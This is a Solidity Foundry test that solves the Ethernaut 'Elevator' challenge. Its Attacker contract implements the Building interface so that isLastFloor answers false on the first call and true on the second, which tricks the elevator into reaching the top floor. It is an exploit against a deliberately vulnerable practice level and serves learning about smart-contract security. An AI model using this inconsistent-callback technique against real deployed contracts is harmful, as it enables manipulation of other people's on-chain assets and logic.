// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Elevator, Building} from "ethernaut/levels/Elevator.sol";

contract ElevatorTest is Test {
    Elevator target;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 1 ether);

        target = new Elevator();
    }

    function attack() private {
        Attacker attacker = new Attacker(address(target));
        attacker.goTo(0); // any floor number should work
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertTrue(target.top(), "must have reached the top floor");
    }
}

contract Attacker is Building {
    Elevator elevator;
    bool isCalled = false;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    // TODO: write a really gas efficient code for this
    function isLastFloor(uint256 /* floor */ ) external returns (bool) {
        if (isCalled) {
            // this is the second call for `top`, should return `true`
            return true;
        } else {
            // this is the first call, should return `false`
            isCalled = true;
            return false;
        }
    }

    // wrapper to call `goTo` on an elevator
    function goTo(uint256 floor) external {
        elevator.goTo(floor);
    }
}
